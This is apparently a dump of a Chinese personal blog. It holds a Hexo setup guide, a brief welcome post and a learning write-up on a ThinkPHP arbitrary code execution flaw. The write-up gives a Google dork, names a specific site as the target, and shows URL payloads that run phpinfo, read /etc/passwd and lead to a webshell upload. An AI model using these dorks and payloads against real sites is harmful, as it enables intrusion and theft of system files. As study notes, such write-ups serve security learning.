uncategorized #默认分类category_map:tag_map:# Archives2: 开启分页1: 禁用分页0: 全部禁用archive: 2category: 2tag: 2# Server #本地服务器port: 4000 #端口号server_ip: localhost #IP 地址logger: falselogger_format: dev# Date / Time format #日期时间格式date_format: YYYY-MM-DD #参考http://momentjs.com/docs/#/displaying/format/time_format: H:mm:ss# Pagination #分页per_page: 10 #每页文章数，设置成 0 禁用分页pagination_dir: page# Disqus #Disqus评论，替换为多说disqus_shortname:# Extensions #拓展插件theme: landscape-plus #主题exclude_generator:plugins: #插件，例如生成 RSS 和站点地图的 hexo-generator-feed hexo-generator-sitemap# Deployment #部署，将 lmintlcx 改成用户名deploy:type: gitrepo: 刚刚github创库地址.gitbranch: master咳咳 同样是已经整理好的，直接拿来用了(⊙o⊙)…需要注意的是：配置文件的格式例如：repo(repository): 这个地方是刚刚创建仓库的时候生成的https这个地方冒号之后要有一个空格将这些保存完之后，大概就基本完成了 编辑一篇文章试试是否成功右键hexo (刚创建的文件夹) git bash here 进入命令行模式：hexo new “测试” 会在_posts 目录下生成文件 测试.md 打开该文件（什么方式都可以，如果要问我_posts目录在哪，那么我会说你上面肯定没认真看 ）里面内容: hexo g: hexo d接着会提示输入一些刚刚设置的用户名和密码大致就是这些了 ，期间有很多不懂的问题 ，在这里感谢大棟哥以及海峰同学的大力帮助","tags":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/tags/生活/"}]},{"title":"Arbitrary code execution (任意代码执行漏洞) ","date":"2016-07-30T12:54:05.000Z","path":"2016/07/30/Arbitrary-code-execution/","text":"任意代码执行漏洞Google 语法：intext:thinkphp intext:&quot;Fast &amp; Simple OOP PHP Framework&quot; intext:&quot;2.1&quot; think 框架可能存在代码执行漏洞的搜索方式 测试网址：http://www.vimdesign.com 触发点：http://www.vimdesign.com/news-detail/id/触发点 思路：利用google语法搜索网址，接着进行测试 使用phpinfo() ,回显页面后，证明存在该漏洞 触发点输入phpinfo() 出现报错 http://www.vimdesign.com/news-detail/id/phpinfo() 使用{${phpinfo()}} 继续测试 http://www.vimdesign.com/news-detail/id/{${phpinfo()}} 思考： 为什么phpinfo（） 不行，但是{${phpinfo()}}可以 证明发现漏洞，使用{${print(getcwd())}} 获取当前工作路径 http://www.vimdesign.com/news-detail/id/{${print(getcwd())}} 读文件 http://www.vimdesign.com/news-detail/id/{${exit(var_dump(file_get_contents($_POST(f))))}} f=/etc/passwd 其中file_get_contents($_POST[f]) 以及在下方的f=/etc/passwd*错误理解：使用这这样做的原因是 这样可以避免file_get_contents(‘/etc/passwd’) 中的引号，避免造成不必要的错误 File_get_contents 把整个文件读入到字符串中 *正确理解：该模式使用的grep_replace 输入的地方被转译，也就是说我们实际得到的参数是 $ret = &quot;{${exit(var_dump(file_get_contents(\\&quot;/etc/passwd\\&quot;)))&quot;}}&apos; 但是我理解成了 $ret = &quot;{${exit(var_dump(file_get_contents(&quot;/etc/passwd&quot;)))&quot;}}&apos; 这就导致了不回显内容的原因 写一句话上传，用菜刀链接 链接成功 总结在获取工作路径的时候一直失败原因：使用语句错误，基础不牢固 在使用var_dump 的时候没有（）闭合 file_get_contents(‘路径’) 不能成功的原因 grep_replace \\1 原因：任意代码执行漏洞常见的有4中模式（一般不能直接判断） 一般扫描器扫描出来的playload 中带有单双引号的可以直接输入 例如 var_dump(file_get_contents(“/etc/passwd”)) Playload 中带有$符号的可能是上诉情况，也可能是 var_dump(file_get_contents(\\“/etc/passwd\\”)) 所以最好使用传参 file_get_contents($_POST[f]) F = /etc/passwd 扩展： A:echo (file_get_contents(“etc/passwd”)) B:echo (file_get_contents(\\“/etc/passwd\\”)) A 可以将”etc/passwd” 翻译成一个代码 B 无法将\\”/etc/passwd\\”翻译成一个代码0 菜刀连接的时候出现连接服务器失败原因：使用了代理服务器 - - 使用phpinfo（） 和 {${phpinfo()}} 的区别原因：A: &lt;?php $data = $_GET[‘data’]; eval(“\\$ret = $data;”); echo $ret; B: &lt;?php $data = $_GET[‘data’]; echo “\\$ret = strtolower(\\”$data\\”);”; eval(“\\$ret = strtolower(\\”$data\\”);”); echo $ret; A 可以直接使用phpinfo()B 使用{￥{phpinfo（）}}区别在于是否有双引号，单引号会直接输入一个字符串，而不是一个函数","tags":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/tags/web安全/"}]},{"title":"新生报道","date":"2016-07-30T12:14:01.000Z","path":"2016/07/30/1/","text":"今天使用别的博客被评太low ,所以花了一下午时间稍稍弄明白了github的一些基础操作明天补上安装过程以及期间失败的原因","tags":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/tags/生活/"}]}]